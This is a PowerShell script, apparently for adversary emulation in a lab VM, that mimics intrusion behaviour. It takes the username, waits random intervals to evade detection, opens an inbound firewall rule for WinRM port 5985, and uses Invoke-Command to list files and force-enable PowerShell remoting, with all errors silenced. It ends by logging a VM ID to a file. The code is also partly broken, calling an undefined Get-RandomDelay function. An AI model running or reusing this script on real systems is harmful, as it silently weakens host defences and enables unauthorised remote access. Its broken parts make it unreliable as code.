class Invader {
    [int32]$time

    Invader() {
    }

    # grab user
    [string] grabUser() {
        try {
            $unrefineduser = whoami.exe
            $userArr = $unrefineduser -split "\\"
            return $userArr[1]
        } catch {
            return $null
        }
    }

    # sleep for this amount of time
    sleep([int]$min, [int]$max) {
        try {
            $this.time = Get-Random -Minimum $min -Maximum $max
            Start-Sleep -Seconds $this.time
        } catch {
            # Silently handle the error without printing anything
        }
    }

    getIpAddress() {
        try {
            $IPAddresses = [System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -ExpandProperty IPAddressToString
            return $IPAddresses
        } catch {
            return $null
        }
    }

    getPort5985() {
        try {
            $IPAddresses = $this.getIpAddress()
            if ($IPAddresses -ne $null) {
                foreach ($IPAddress in $IPAddresses) {
                    $Port5985Open = Test-NetConnection -ComputerName $IPAddress -Port 5985 | Select-Object -ExpandProperty TcpTestSucceeded
                    if ($Port5985Open -eq $true) {
                        # Set up firewall rule
                        try {
                            New-NetFirewallRule -DisplayName "Allow WinRM" -Direction Inbound -LocalPort 5985 -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
                        } catch {
                            # Silently handle the error without printing anything
                        }

                        # Introduce delay before invoking command
                        Start-Sleep -Seconds (Get-RandomDelay)

                        # Invoke command if WinRM service is running
                        $this.InvokeWinRMCommand($IPAddress)
                    }
                }
            }
        } catch {
            # Silently handle the error without printing anything
        }
    }

    InvokeWinRMCommand($IPAddress) {
        try {
            Invoke-Command -ComputerName $IPAddress -ScriptBlock {
                dir c:\
                Enable-PSRemoting -Force
            } -ErrorAction SilentlyContinue
        } catch {
            # Silently handle the error without printing anything
        }
    }
}

# create an instance of the Invader class
$Invade = New-Object -TypeName Invader

# perform actions
$Invade.sleep(10,20)
$Invade.getIpAddress()
$Invade.sleep(10,20)
$Invade.getPort5985()
$Invade.sleep(10,20)
$Invade.InvokeWinRMCommand($Invade.getIpAddress())


# Logging starts here
# Get VM unique identifier, current time, and script name
$vmID = (Get-WmiObject -Class Win32_ComputerSystem).Name
$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$scriptName = $MyInvocation.MyCommand.Name

# Define the path for the log file
$logPath = "C:\Users\User1\Desktop\logs\logFile.log"

# Format the log entry
$logEntry = "VM ID: $vmID, Time: $currentTime, Script: $scriptName"

# Write log entry to the log file
Add-Content -Path $logPath -Value $logEntry


Write-Host "Log file saved."